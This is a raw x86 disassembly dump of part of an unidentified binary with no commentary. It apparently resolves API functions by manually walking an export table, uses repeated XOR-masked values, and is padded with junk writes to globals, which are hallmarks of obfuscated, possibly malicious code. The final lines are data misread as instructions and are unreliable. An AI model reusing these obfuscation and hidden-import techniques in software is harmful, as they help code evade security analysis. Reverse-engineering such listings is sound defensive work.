  4216e7:	mov    edx,DWORD PTR [ebp-0x158]
  4216ed:	xor    eax,0xca79a575
  4216f2:	xor    edx,0x9c1b89e8
  4216f8:	mov    cl,0x2
  4216fa:	call   0x40a9b5
  4216ff:	mov    esi,eax
  421701:	mov    edi,edx
  421703:	mov    eax,DWORD PTR [ebp-0x15c]
  421709:	mov    edx,DWORD PTR [ebp-0x158]
  42170f:	xor    eax,0xca79a575
  421714:	xor    edx,0x9c1b89e8
  42171a:	mov    cl,0x3e
  42171c:	call   0x4221fc
  421721:	or     esi,eax
  421723:	or     edi,edx
  421725:	mov    DWORD PTR [ebp-0x178],esi
  42172b:	mov    ecx,DWORD PTR [ebp-0xd8]
  421731:	mov    eax,0x459a
  421736:	xor    edx,edx
  421738:	div    ecx
  42173a:	mov    ecx,DWORD PTR [ebp-0xdc]
  421740:	and    eax,ecx
  421742:	add    eax,DWORD PTR [ebp-0x44]
  421745:	mov    ecx,DWORD PTR [ebp-0xe0]
  42174b:	lea    eax,[eax+ecx*1+0x272f]
  421752:	xor    eax,0x1080c
  421757:	add    eax,DWORD PTR [ebp-0x178]
  42175d:	mov    DWORD PTR [ebp-0xe8],eax
  421763:	mov    DWORD PTR [ebp-0xc],0x5950
  42176a:	mov    DWORD PTR [ebp-0xf8],0x4964
  421774:	mov    DWORD PTR [ebp-0x130],0x3
  42177e:	mov    DWORD PTR [ebp-0x20],0x2df9
  421785:	mov    DWORD PTR [ebp-0x8],0x4524
  42178c:	mov    DWORD PTR [ebp-0xd4],0x637e
  421796:	mov    DWORD PTR [ebp-0x110],0x38c8
  4217a0:	mov    DWORD PTR [ebp-0xa4],0x7118
  4217aa:	mov    DWORD PTR [ebp-0xa0],0xaf6
  4217b4:	mov    DWORD PTR [ebp-0x10c],0x3315
  4217be:	mov    eax,DWORD PTR [ebp-0xf8]
  4217c4:	mov    ecx,DWORD PTR [ebp-0x130]
  4217ca:	xor    edx,edx
  4217cc:	div    ecx
  4217ce:	add    eax,0x454e
  4217d3:	mov    ecx,DWORD PTR [ebp-0xc]
  4217d6:	and    eax,ecx
  4217d8:	xor    eax,0x5940
  4217dd:	add    eax,DWORD PTR [ebp+0x8]
  4217e0:	mov    ecx,DWORD PTR [ebp-0x110]
  4217e6:	mov    edx,DWORD PTR [ebp-0xa4]
  4217ec:	sub    ecx,edx
  4217ee:	mov    edx,DWORD PTR [ebp-0xd4]
  4217f4:	or     ecx,edx
  4217f6:	mov    edx,DWORD PTR [ebp-0x8]
  4217f9:	and    ecx,edx
  4217fb:	mov    edx,DWORD PTR [ebp-0x20]
  4217fe:	xor    ecx,edx
  421800:	mov    edx,DWORD PTR [ebp-0x10c]
  421806:	mov    esi,0x180f
  42180b:	sub    esi,edx
  42180d:	mov    edx,DWORD PTR [ebp-0xa0]
  421813:	imul   esi,edx
  421816:	xor    esi,0x402b
  42181c:	xor    esi,0xfed78c17
  421822:	mov    edx,DWORD PTR [ebp-0xe8]
  421828:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  42182f:	add    ecx,eax
  421831:	add    esi,ecx
  421833:	mov    DWORD PTR [ebp-0x38],esi
  421836:	mov    DWORD PTR [ebp-0x4],0x59a8
  42183d:	mov    DWORD PTR [ebp-0x30],0x7021
  421844:	mov    DWORD PTR [ebp-0xf4],0x6210
  42184e:	mov    DWORD PTR [ebp-0x58],0x73d5
  421855:	mov    DWORD PTR [ebp-0x124],0x1e7d
  42185f:	mov    DWORD PTR [ebp-0x3c],0x3144
  421866:	mov    eax,DWORD PTR [ebp-0x30]
  421869:	xor    eax,0x75cb
  42186e:	mov    ecx,DWORD PTR [ebp-0x4]
  421871:	imul   eax,ecx
  421874:	mov    ecx,DWORD PTR [ebp+0x8]
  421877:	lea    ecx,[ecx+eax*1-0x2123b90]
  42187e:	mov    eax,DWORD PTR [ebp-0xf4]
  421884:	and    eax,0x6b34
  421889:	and    eax,0x658d
  42188e:	xor    edx,edx
  421890:	push   0x6
  421892:	pop    esi
  421893:	div    esi
  421895:	imul   eax,eax,0x3fb9
  42189b:	mov    edx,DWORD PTR [ebp-0x3c]
  42189e:	and    edx,0x58c7
  4218a4:	mov    esi,DWORD PTR [ebp-0x124]
  4218aa:	or     edx,esi
  4218ac:	add    edx,0x7a25
  4218b2:	imul   edx,edx,0x28d2
  4218b8:	mov    esi,DWORD PTR [ebp-0x58]
  4218bb:	xor    edx,esi
  4218bd:	xor    edx,0x1856f731
  4218c3:	mov    esi,DWORD PTR [ebp-0xe8]
  4218c9:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  4218d0:	add    eax,ecx
  4218d2:	add    edx,eax
  4218d4:	mov    DWORD PTR [ebp-0xac],edx
  4218da:	mov    DWORD PTR [ebp-0x54],0x1
  4218e1:	mov    DWORD PTR [ebp-0x40],0x1ee8
  4218e8:	mov    DWORD PTR [ebp-0x1c],0x64d8
  4218ef:	mov    DWORD PTR [ebp-0xf0],0x5a06
  4218f9:	mov    DWORD PTR [ebp-0x108],0x2eeb
  421903:	mov    DWORD PTR [ebp-0x104],0x2108
  42190d:	mov    eax,DWORD PTR [ebp-0x1c]
  421910:	xor    edx,edx
  421912:	push   0x3
  421914:	pop    ecx
  421915:	div    ecx
  421917:	mov    ecx,DWORD PTR [ebp-0x40]
  42191a:	or     eax,ecx
  42191c:	mov    ecx,DWORD PTR [ebp-0x54]
  42191f:	xor    edx,edx
  421921:	div    ecx
  421923:	imul   eax,eax,0x7d53
  421929:	mov    ecx,DWORD PTR [ebp+0x8]
  42192c:	lea    eax,[ecx+eax*1-0x1f534807]
  421933:	mov    ecx,DWORD PTR [ebp-0xf0]
  421939:	and    ecx,0x4108
  42193f:	and    ecx,0x40e7
  421945:	sub    ecx,0x1a54
  42194b:	xor    ecx,0x25ac
  421951:	mov    edx,DWORD PTR [ebp-0x104]
  421957:	xor    edx,0x6dda
  42195d:	mov    esi,DWORD PTR [ebp-0x108]
  421963:	and    edx,esi
  421965:	and    edx,0xe0c
  42196b:	or     edx,0x5b
  42196e:	mov    esi,DWORD PTR [ebp-0xe8]
  421974:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  421978:	add    ecx,eax
  42197a:	lea    eax,[edx+ecx*1-0xc5b]
  421981:	mov    DWORD PTR [ebp-0xa8],eax
  421987:	and    DWORD PTR [ebp-0x144],0x0
  42198e:	jmp    0x4219a0
  421993:	mov    eax,DWORD PTR [ebp-0x144]
  421999:	inc    eax
  42199a:	mov    DWORD PTR [ebp-0x144],eax
  4219a0:	mov    eax,DWORD PTR [ebp-0xe8]
  4219a6:	mov    ecx,DWORD PTR [ebp-0x144]
  4219ac:	cmp    ecx,DWORD PTR [eax+0x18]
  4219af:	je     0x421f68
  4219b5:	mov    eax,DWORD PTR [ebp-0x144]
  4219bb:	mov    ecx,DWORD PTR [ebp-0x38]
  4219be:	mov    edx,DWORD PTR [ebp+0x8]
  4219c1:	add    edx,DWORD PTR [ecx+eax*4]
  4219c4:	mov    DWORD PTR [ebp-0x48],edx
  4219c7:	mov    eax,DWORD PTR [ebp-0x48]
  4219ca:	mov    DWORD PTR [ebp-0x210],eax
  4219d0:	mov    eax,DWORD PTR [ebp+0xc]
  4219d3:	mov    DWORD PTR [ebp-0x20c],eax
  4219d9:	mov    DWORD PTR [ebp-0x1f0],0xca79a575
  4219e3:	mov    DWORD PTR [ebp-0x1ec],0x9c1b89e8
  4219ed:	mov    DWORD PTR [ebp-0x1e0],0xca79a571
  4219f7:	mov    DWORD PTR [ebp-0x1dc],0x9c1b89e8
  421a01:	lea    eax,[ebp-0x1e8]
  421a07:	mov    DWORD PTR [ebp-0x1f4],eax
  421a0d:	mov    eax,DWORD PTR [ebp-0x20c]
  421a13:	movzx  eax,WORD PTR [eax+0x20]
  421a17:	xor    eax,0xa49b
  421a1c:	movzx  eax,ax
  421a1f:	sar    eax,1
  421a21:	mov    ecx,DWORD PTR [ebp-0x20c]
  421a27:	movzx  ecx,WORD PTR [ecx+0x20]
  421a2b:	xor    ecx,0xa49b
  421a31:	movzx  ecx,cx
  421a34:	shl    ecx,0xf
  421a37:	or     eax,ecx
  421a39:	movzx  eax,ax
  421a3c:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421a42:	mov    DWORD PTR [ecx],eax
  421a44:	mov    eax,DWORD PTR [ebp-0x1e0]
  421a4a:	mov    edx,DWORD PTR [ebp-0x1dc]
  421a50:	xor    eax,0xca79a575
  421a55:	xor    edx,0x9c1b89e8
  421a5b:	mov    cl,0x2
  421a5d:	call   0x40a9b5
  421a62:	mov    ebx,eax
  421a64:	mov    esi,edx
  421a66:	mov    eax,DWORD PTR [ebp-0x1e0]
  421a6c:	mov    edx,DWORD PTR [ebp-0x1dc]
  421a72:	xor    eax,0xca79a575
  421a77:	xor    edx,0x9c1b89e8
  421a7d:	mov    cl,0x3e
  421a7f:	call   0x4221fc
  421a84:	or     ebx,eax
  421a86:	or     esi,edx
  421a88:	movzx  eax,bl
  421a8b:	push   eax
  421a8c:	lea    eax,[ebp-0x198]
  421a92:	push   eax
  421a93:	call   0x416c9e
  421a98:	mov    eax,DWORD PTR [ebp-0x1f0]
  421a9e:	mov    edx,DWORD PTR [ebp-0x1ec]
  421aa4:	xor    eax,0xca79a575
  421aa9:	xor    edx,0x9c1b89e8
  421aaf:	mov    cl,0x2
  421ab1:	call   0x40a9b5
  421ab6:	mov    esi,eax
  421ab8:	mov    edi,edx
  421aba:	mov    eax,DWORD PTR [ebp-0x1f0]
  421ac0:	mov    edx,DWORD PTR [ebp-0x1ec]
  421ac6:	xor    eax,0xca79a575
  421acb:	xor    edx,0x9c1b89e8
  421ad1:	mov    cl,0x3e
  421ad3:	call   0x4221fc
  421ad8:	or     esi,eax
  421ada:	or     edi,edx
  421adc:	mov    DWORD PTR [ebp-0x1f8],esi
  421ae2:	jmp    0x421b37
  421ae7:	mov    eax,DWORD PTR [ebp-0x1e0]
  421aed:	mov    edx,DWORD PTR [ebp-0x1dc]
  421af3:	xor    eax,0xca79a575
  421af8:	xor    edx,0x9c1b89e8
  421afe:	mov    cl,0x2
  421b00:	call   0x40a9b5
  421b05:	mov    esi,eax
  421b07:	mov    edi,edx
  421b09:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b0f:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b15:	xor    eax,0xca79a575
  421b1a:	xor    edx,0x9c1b89e8
  421b20:	mov    cl,0x3e
  421b22:	call   0x4221fc
  421b27:	or     esi,eax
  421b29:	or     edi,edx
  421b2b:	add    esi,DWORD PTR [ebp-0x1f8]
  421b31:	mov    DWORD PTR [ebp-0x1f8],esi
  421b37:	mov    eax,DWORD PTR [ebp-0x1e8]
  421b3d:	cmp    DWORD PTR [ebp-0x1f8],eax
  421b43:	je     0x421bd6
  421b49:	mov    eax,DWORD PTR [ebp-0x1f8]
  421b4f:	mov    ecx,DWORD PTR [ebp-0x20c]
  421b55:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421b5a:	xor    eax,0xa49b
  421b5f:	movzx  eax,ax
  421b62:	sar    eax,1
  421b64:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421b6a:	mov    edx,DWORD PTR [ebp-0x20c]
  421b70:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421b75:	xor    ecx,0xa49b
  421b7b:	movzx  ecx,cx
  421b7e:	shl    ecx,0xf
  421b81:	or     eax,ecx
  421b83:	movzx  eax,ax
  421b86:	mov    DWORD PTR [ebp-0x1fc],eax
  421b8c:	mov    eax,DWORD PTR [ebp-0x1f8]
  421b92:	mov    ecx,DWORD PTR [ebp-0x20c]
  421b98:	movzx  eax,WORD PTR [ecx+eax*4]
  421b9c:	xor    eax,0xa49b
  421ba1:	movzx  eax,ax
  421ba4:	sar    eax,1
  421ba6:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421bac:	mov    edx,DWORD PTR [ebp-0x20c]
  421bb2:	movzx  ecx,WORD PTR [edx+ecx*4]
  421bb6:	xor    ecx,0xa49b
  421bbc:	movzx  ecx,cx
  421bbf:	shl    ecx,0xf
  421bc2:	or     eax,ecx
  421bc4:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421bca:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421bd1:	jmp    0x421ae7
  421bd6:	mov    eax,DWORD PTR [ebp-0x1f0]
  421bdc:	mov    edx,DWORD PTR [ebp-0x1ec]
  421be2:	xor    eax,0xca79a575
  421be7:	xor    edx,0x9c1b89e8
  421bed:	mov    cl,0x2
  421bef:	call   0x40a9b5
  421bf4:	mov    esi,eax
  421bf6:	mov    edi,edx
  421bf8:	mov    eax,DWORD PTR [ebp-0x1f0]
  421bfe:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c04:	xor    eax,0xca79a575
  421c09:	xor    edx,0x9c1b89e8
  421c0f:	mov    cl,0x3e
  421c11:	call   0x4221fc
  421c16:	or     esi,eax
  421c18:	or     edi,edx
  421c1a:	mov    DWORD PTR [ebp-0x1e4],esi
  421c20:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c26:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c2c:	xor    eax,0xca79a575
  421c31:	xor    edx,0x9c1b89e8
  421c37:	mov    cl,0x2
  421c39:	call   0x40a9b5
  421c3e:	mov    esi,eax
  421c40:	mov    edi,edx
  421c42:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c48:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c4e:	xor    eax,0xca79a575
  421c53:	xor    edx,0x9c1b89e8
  421c59:	mov    cl,0x3e
  421c5b:	call   0x4221fc
  421c60:	or     esi,eax
  421c62:	or     edi,edx
  421c64:	mov    DWORD PTR [ebp-0x23c],esi
  421c6a:	mov    DWORD PTR [ebp-0x238],edi
  421c70:	mov    eax,DWORD PTR [ebp-0x23c]
  421c76:	or     eax,DWORD PTR [ebp-0x238]
  421c7c:	je     0x421edc
  421c82:	lea    eax,[ebp-0x204]
  421c88:	mov    DWORD PTR [ebp-0x208],eax
  421c8e:	mov    eax,DWORD PTR [ebp-0x1e4]
  421c94:	xor    edx,edx
  421c96:	mov    cl,0x2
  421c98:	call   0x4221fc
  421c9d:	mov    esi,eax
  421c9f:	mov    edi,edx
  421ca1:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ca7:	xor    edx,edx
  421ca9:	mov    cl,0x3e
  421cab:	call   0x40a9b5
  421cb0:	or     esi,eax
  421cb2:	or     edi,edx
  421cb4:	xor    esi,0xca79a575
  421cba:	xor    edi,0x9c1b89e8
  421cc0:	mov    eax,DWORD PTR [ebp-0x208]
  421cc6:	mov    DWORD PTR [eax],esi
  421cc8:	mov    DWORD PTR [eax+0x4],edi
  421ccb:	mov    eax,DWORD PTR [ebp-0x1e4]
  421cd1:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421cd9:	mov    eax,DWORD PTR [ebp-0x1e0]
  421cdf:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ce5:	xor    eax,0xca79a575
  421cea:	xor    edx,0x9c1b89e8
  421cf0:	mov    cl,0x2
  421cf2:	call   0x40a9b5
  421cf7:	mov    ebx,eax
  421cf9:	mov    edi,edx
  421cfb:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d01:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d07:	xor    eax,0xca79a575
  421d0c:	xor    edx,0x9c1b89e8
  421d12:	mov    cl,0x3e
  421d14:	call   0x4221fc
  421d19:	or     ebx,eax
  421d1b:	or     edi,edx
  421d1d:	movsx  eax,bl
  421d20:	cmp    esi,eax
  421d22:	je     0x421e82
  421d28:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d2e:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d36:	mov    eax,DWORD PTR [ebp-0x204]
  421d3c:	mov    edx,DWORD PTR [ebp-0x200]
  421d42:	xor    eax,0xca79a575
  421d47:	xor    edx,0x9c1b89e8
  421d4d:	mov    cl,0x2
  421d4f:	call   0x40a9b5
  421d54:	mov    edi,eax
  421d56:	mov    ebx,edx
  421d58:	mov    eax,DWORD PTR [ebp-0x204]
  421d5e:	mov    edx,DWORD PTR [ebp-0x200]
  421d64:	xor    eax,0xca79a575
  421d69:	xor    edx,0x9c1b89e8
  421d6f:	mov    cl,0x3e
  421d71:	call   0x4221fc
  421d76:	or     edi,eax
  421d78:	or     ebx,edx
  421d7a:	mov    eax,DWORD PTR [ebp-0x210]
  421d80:	movsx  eax,BYTE PTR [eax+edi*1]
  421d84:	cmp    esi,eax
  421d86:	je     0x421d96
  421d8c:	jmp    0x421edc
  421d91:	jmp    0x421e82
  421d96:	mov    eax,DWORD PTR [ebp-0x204]
  421d9c:	mov    edx,DWORD PTR [ebp-0x200]
  421da2:	xor    eax,0xca79a575
  421da7:	xor    edx,0x9c1b89e8
  421dad:	mov    cl,0x2
  421daf:	call   0x40a9b5
  421db4:	mov    esi,eax
  421db6:	mov    edi,edx
  421db8:	mov    eax,DWORD PTR [ebp-0x204]
  421dbe:	mov    edx,DWORD PTR [ebp-0x200]
  421dc4:	xor    eax,0xca79a575
  421dc9:	xor    edx,0x9c1b89e8
  421dcf:	mov    cl,0x3e
  421dd1:	call   0x4221fc
  421dd6:	or     esi,eax
  421dd8:	or     edi,edx
  421dda:	mov    eax,DWORD PTR [ebp-0x210]
  421de0:	movsx  esi,BYTE PTR [eax+esi*1]
  421de4:	mov    eax,DWORD PTR [ebp-0x1f0]
  421dea:	mov    edx,DWORD PTR [ebp-0x1ec]
  421df0:	xor    eax,0xca79a575
  421df5:	xor    edx,0x9c1b89e8
  421dfb:	mov    cl,0x2
  421dfd:	call   0x40a9b5
  421e02:	mov    ebx,eax
  421e04:	mov    edi,edx
  421e06:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e0c:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e12:	xor    eax,0xca79a575
  421e17:	xor    edx,0x9c1b89e8
  421e1d:	mov    cl,0x3e
  421e1f:	call   0x4221fc
  421e24:	or     ebx,eax
  421e26:	or     edi,edx
  421e28:	movsx  eax,bl
  421e2b:	cmp    esi,eax
  421e2d:	jne    0x421e82
  421e33:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e39:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e3f:	xor    eax,0xca79a575
  421e44:	xor    edx,0x9c1b89e8
  421e4a:	mov    cl,0x2
  421e4c:	call   0x40a9b5
  421e51:	mov    esi,eax
  421e53:	mov    edi,edx
  421e55:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e5b:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e61:	xor    eax,0xca79a575
  421e66:	xor    edx,0x9c1b89e8
  421e6c:	mov    cl,0x3e
  421e6e:	call   0x4221fc
  421e73:	or     esi,eax
  421e75:	or     edi,edx
  421e77:	mov    DWORD PTR [ebp-0x214],esi
  421e7d:	jmp    0x421f26
  421e82:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e88:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e8e:	xor    eax,0xca79a575
  421e93:	xor    edx,0x9c1b89e8
  421e99:	mov    cl,0x2
  421e9b:	call   0x40a9b5
  421ea0:	mov    esi,eax
  421ea2:	mov    edi,edx
  421ea4:	mov    eax,DWORD PTR [ebp-0x1e0]
  421eaa:	mov    edx,DWORD PTR [ebp-0x1dc]
  421eb0:	xor    eax,0xca79a575
  421eb5:	xor    edx,0x9c1b89e8
  421ebb:	mov    cl,0x3e
  421ebd:	call   0x4221fc
  421ec2:	or     esi,eax
  421ec4:	or     edi,edx
  421ec6:	add    esi,DWORD PTR [ebp-0x1e4]
  421ecc:	mov    DWORD PTR [ebp-0x1e4],esi
  421ed2:	jmp    0x421c20
  421ed7:	jmp    0x421c20
  421edc:	mov    eax,DWORD PTR [ebp-0x1f0]
  421ee2:	mov    edx,DWORD PTR [ebp-0x1ec]
  421ee8:	xor    eax,0xca79a575
  421eed:	xor    edx,0x9c1b89e8
  421ef3:	mov    cl,0x2
  421ef5:	call   0x40a9b5
  421efa:	mov    esi,eax
  421efc:	mov    edi,edx
  421efe:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f04:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f0a:	xor    eax,0xca79a575
  421f0f:	xor    edx,0x9c1b89e8
  421f15:	mov    cl,0x3e
  421f17:	call   0x4221fc
  421f1c:	or     esi,eax
  421f1e:	or     edi,edx
  421f20:	mov    DWORD PTR [ebp-0x214],esi
  421f26:	mov    eax,DWORD PTR [ebp-0x214]
  421f2c:	mov    DWORD PTR [ebp-0xc8],eax
  421f32:	cmp    DWORD PTR [ebp-0xc8],0x0
  421f39:	je     0x421f63
  421f3f:	mov    eax,DWORD PTR [ebp-0x144]
  421f45:	mov    ecx,DWORD PTR [ebp-0xac]
  421f4b:	movzx  eax,WORD PTR [ecx+eax*2]
  421f4f:	mov    ecx,DWORD PTR [ebp-0xa8]
  421f55:	mov    eax,DWORD PTR [ecx+eax*4]
  421f58:	mov    DWORD PTR [ebp-0xfc],eax
  421f5e:	jmp    0x421f68
  421f63:	jmp    0x421993
  421f68:	cmp    DWORD PTR [ebp-0xfc],0x0
  421f6f:	jne    0x421f7c
  421f75:	xor    eax,eax
  421f77:	jmp    0x4221f5
  421f7c:	mov    eax,DWORD PTR [ebp+0x8]
  421f7f:	add    eax,DWORD PTR [ebp-0xfc]
  421f85:	mov    DWORD PTR [ebp-0xec],eax
  421f8b:	mov    DWORD PTR [ebp-0x74],0x0
  421f92:	cmp    DWORD PTR [ebp-0xb0],0x0
  421f99:	je     0x422015
  421f9f:	cmp    DWORD PTR [ebp-0xb0],0x0
  421fa6:	je     0x422015
  421fac:	mov    eax,DWORD PTR [ebp-0xb0]
  421fb2:	shl    eax,0x2
  421fb5:	mov    DWORD PTR [ebp-0x74],eax
  421fb8:	mov    DWORD PTR [ebp-0x14c],0x0
  421fc2:	sub    esp,DWORD PTR [ebp-0x74]
  421fc5:	mov    DWORD PTR [ebp-0x14c],esp
  421fcb:	mov    DWORD PTR [ebp-0x148],0x0
  421fd5:	mov    eax,DWORD PTR [ebp-0x148]
  421fdb:	cmp    eax,DWORD PTR [ebp-0xb0]
  421fe1:	je     0x422015
  421fe7:	mov    eax,DWORD PTR [ebp-0x148]
  421fed:	mov    ecx,DWORD PTR [ebp-0x14c]
  421ff3:	mov    edx,DWORD PTR [ebp-0x148]
  421ff9:	mov    esi,DWORD PTR [ebp+0x14]
  421ffc:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  422000:	mov    DWORD PTR [ecx+eax*4],edx
  422003:	mov    eax,DWORD PTR [ebp-0x148]
  422009:	inc    eax
  42200a:	mov    DWORD PTR [ebp-0x148],eax
  422010:	jmp    0x421fd5
  422015:	mov    DWORD PTR [ebp-0x9c],0x0
  42201f:	push   0x4221ae
  422024:	jmp    DWORD PTR [ebp-0xec]
  42202a:	mov    eax,eax
  42202c:	mov    ecx,esp
  42202e:	ret    0xc
  422031:	cmp    DWORD PTR ds:0x4282bf,0x0
  422038:	mov    DWORD PTR ds:0x4282bb,0x7476
  422042:	mov    DWORD PTR ds:0x428137,0x1cdc
  42204c:	mov    DWORD PTR ds:0x4282bb,0x65fa
  422056:	mov    DWORD PTR ds:0x428127,0x5dca
  422060:	jmp    0x4220aa
  422065:	mov    eax,ds:0x4282b7
  42206a:	cmp    DWORD PTR ds:0x4282bf,0x0
  422071:	jbe    0x422092
  422077:	push   0x24f1
  42207c:	call   DWORD PTR ds:0x428d38
  422082:	inc    DWORD PTR ds:0x428363
  422088:	sub    DWORD PTR ds:0x428143,0x46d9
  422092:	inc    DWORD PTR ds:0x4282bf
  422098:	adc    DWORD PTR ds:0x4282cb,ebx
  42209e:	or     DWORD PTR ds:0x4281f3,0x4029
  4220a8:	not    eax
  4220aa:	push   ebx
  4220ab:	push   esi
  4220ac:	sbb    DWORD PTR ds:0x42834f,edx
  4220b2:	mov    eax,DWORD PTR [esp+0x18]
  4220b6:	or     eax,eax
  4220b8:	jne    0x4220e8
  4220be:	mov    ecx,DWORD PTR [esp+0x14]
  4220c2:	mov    eax,DWORD PTR [esp+0x10]
  4220c6:	xor    edx,edx
  4220c8:	div    ecx
  4220ca:	xor    DWORD PTR ds:0x42814f,0x45f1
  4220d4:	mov    ebx,eax
  4220d6:	mov    eax,DWORD PTR [esp+0xc]
  4220da:	div    ecx
  4220dc:	mov    edx,0x36e3
  4220e1:	mov    edx,ebx
  4220e3:	jmp    0x4221a9
  4220e8:	mov    ecx,eax
  4220ea:	sbb    eax,0x67a9
  4220ef:	mov    ebx,DWORD PTR [esp+0x14]
  4220f3:	cmp    DWORD PTR ds:0x4282b7,0x0
  4220fa:	mov    edx,DWORD PTR ds:0x428367
  422100:	mov    DWORD PTR ds:0x4282e7,0x4bc7
  42210a:	mov    edx,DWORD PTR ds:0x4282cf
  422110:	jmp    0x42215a
  422115:	mov    DWORD PTR ds:0x428217,0x15f
  42211f:	mov    DWORD PTR ds:0x42824f,0x4dd1
  422129:	cmp    DWORD PTR ds:0x4282b7,0x0
  422130:	jle    0x42214d
  422136:	push   0x824e
  42213b:	call   DWORD PTR ds:0x428d3c
  422141:	xor    DWORD PTR ds:0x4282cf,0x6c44
  42214b:	sub    edx,edx
  42214d:	sbb    DWORD PTR ds:0x428217,0x445e
  422157:	dec    edx
  422158:	not    edx
  42215a:	mov    edx,DWORD PTR [esp+0x10]
  42215e:	mov    eax,DWORD PTR [esp+0xc]
  422162:	shr    ecx,1
  422164:	rcr    ebx,1
  422166:	shr    edx,1
  422168:	rcr    eax,1
  42216a:	or     ecx,ecx
  42216c:	jne    0x422162
  422172:	div    ebx
  422174:	mov    esi,eax
  422176:	mul    DWORD PTR [esp+0x18]
  42217a:	mov    ecx,eax
  42217c:	mov    eax,DWORD PTR [esp+0x14]
  422180:	mul    esi
  422182:	add    edx,ecx
  422184:	jb     0x4221a4
  42218a:	cmp    edx,DWORD PTR [esp+0x10]
  42218e:	ja     0x4221a4
  422194:	jb     0x4221a5
  42219a:	cmp    eax,DWORD PTR [esp+0xc]
  42219e:	jbe    0x4221a5
  4221a4:	dec    esi
  4221a5:	xor    edx,edx
  4221a7:	mov    eax,esi
  4221a9:	pop    esi
  4221aa:	pop    ebx
  4221ab:	ret    0x10
  4221ae:	or     DWORD PTR ds:0x428333,0x42833f
  4221b8:	sub    DWORD PTR [ebp+0x10],0x1
  4221bc:	mov    DWORD PTR ds:0x42813b,0x43bf
  4221c6:	cmp    DWORD PTR [ebp+0x10],0x0
  4221ca:	mov    DWORD PTR ds:0x42832b,0x612a
  4221d4:	je     0x4221e3
  4221da:	xor    DWORD PTR ds:0x428127,edx
  4221e0:	add    esp,DWORD PTR [ebp-0x74]
  4221e3:	mov    DWORD PTR [ebp-0x9c],eax
  4221e9:	mov    DWORD PTR ds:0x42822f,ebx
  4221ef:	mov    eax,DWORD PTR [ebp-0x9c]
  4221f5:	pop    edi
  4221f6:	pop    esi
  4221f7:	pop    ebx
  4221f8:	leave  
  4221f9:	ret    0x10
  4221fc:	cmp    cl,0x40
  4221ff:	mov    DWORD PTR ds:0x428213,0x43a8
  422209:	jae    0x42225b
  42220f:	mov    DWORD PTR ds:0x428147,0x42f2
  422219:	cmp    cl,0x20
  42221c:	mov    DWORD PTR ds:0x42812f,0x3d58
  422226:	jae    0x422246
  42222c:	or     DWORD PTR ds:0x428123,0x5e1e
  422236:	shld   edx,eax,cl
  422239:	mov    DWORD PTR ds:0x428247,0x1bd2
  422243:	shl    eax,cl
  422245:	ret    
  422246:	inc    edx
  422247:	mov    edx,eax
  422249:	sub    DWORD PTR ds:0x428363,0x4282bb
  422253:	xor    eax,eax
  422255:	and    cl,0x1f
  422258:	shl    edx,cl
  42225a:	ret    
  42225b:	xor    eax,eax
  42225d:	xor    edx,edx
  42225f:	ret    
  422260:	jmp    0x3c568da0
  422265:	es sub al,0x44
  422268:	jno    0x4222d3
  42226a:	ja     0x4222d1
  42226c:	int3   
  42226d:	fsubr  QWORD PTR [edx+0x1e]
  422270:	jo     0x4222d7
  422272:	popa   
  422273:	ins    BYTE PTR es:[edi],dx
  422274:	push   eax
  422275:	lods   eax,DWORD PTR ds:[esi]
  422276:	xor    DWORD PTR [esi+0x41],edi
  422279:	ins    BYTE PTR es:[edi],dx
  42227a:	popa   
  42227b:	outs   dx,BYTE PTR ds:[esi]
  42227c:	add    BYTE PTR [eax],al
  42227e:	add    BYTE PTR [eax],al
  422280:	addr16 jb 0x4222e8
  422283:	popa   
  422284:	je     0x4222ed
  422286:	jb     0x4222ed
  422288:	popa   
  422289:	je     0x4222f2
  42228b:	jb     0x4222f2
  42228d:	popa   
  42228e:	je     0x4222f7
  422290:	jb     0x4222f7
  422292:	popa   
  422293:	je     0x4222fc
  422295:	jb     0x4222fc
  422297:	popa   
  422298:	je     0x422301
  42229a:	jb     0x422301
  42229c:	popa   
  42229d:	je     0x422306
  42229f:	jb     0x422306
  4222a1:	popa   
  4222a2:	je     0x42230b
  4222a4:	jb     0x42230b
  4222a6:	popa   
  4222a7:	je     0x422310
  4222a9:	jb     0x422310
  4222ab:	popa   
  4222ac:	je     0x422315
  4222ae:	jb     0x422315
  4222b0:	popa   
  4222b1:	je     0x4222b3
  4222b3:	add    BYTE PTR [eax+0x65],ch
  4222b6:	ins    BYTE PTR es:[edi],dx
  4222b7:	ins    BYTE PTR es:[edi],dx
  4222b8:	push   0x686c6c65
  4222bd:	gs ins BYTE PTR es:[edi],dx
  4222bf:	ins    BYTE PTR es:[edi],dx
  4222c0:	push   0x686c6c65
  4222c5:	gs ins BYTE PTR es:[edi],dx
  4222c7:	ins    BYTE PTR es:[edi],dx
